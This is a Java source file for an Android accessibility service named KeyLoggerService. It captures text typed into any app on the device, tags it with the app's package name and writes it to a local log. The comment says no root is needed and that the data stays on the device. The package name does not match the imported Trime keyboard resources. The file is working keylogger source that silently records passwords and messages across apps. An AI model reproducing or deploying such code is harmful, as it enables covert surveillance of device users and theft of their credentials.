package com.keyrecord.app;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;

import com.osfans.trime.R;

/**
 * Captures text typed into any app on this device through the Accessibility
 * API (no root required). Everything is written locally via LogManager and is
 * never transmitted off the device (this app declares no INTERNET permission).
 */
public class KeyLoggerService extends AccessibilityService {

    private LogManager logManager;

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        logManager = LogManager.getInstance(this);
        logManager.appendEvent(getString(R.string.event_started));
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (logManager == null) {
            logManager = LogManager.getInstance(this);
        }
        int type = event.getEventType();
        if (type != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                && type != AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
            return;
        }

        CharSequence pkg = event.getPackageName();
        CharSequence text = (event.getText() != null && !event.getText().isEmpty())
                ? event.getText().get(0)
                : null;

        if (text != null && text.length() > 0) {
            String source = (pkg != null) ? pkg.toString() : "?";
            logManager.appendEntry(source, text.toString());
        }
    }

    @Override
    public void onInterrupt() {
        if (logManager != null) {
            logManager.appendEvent(getString(R.string.event_interrupted));
        }
    }

    @Override
    public void onDestroy() {
        if (logManager != null) {
            logManager.appendEvent(getString(R.string.event_stopped));
        }
        super.onDestroy();
    }
}
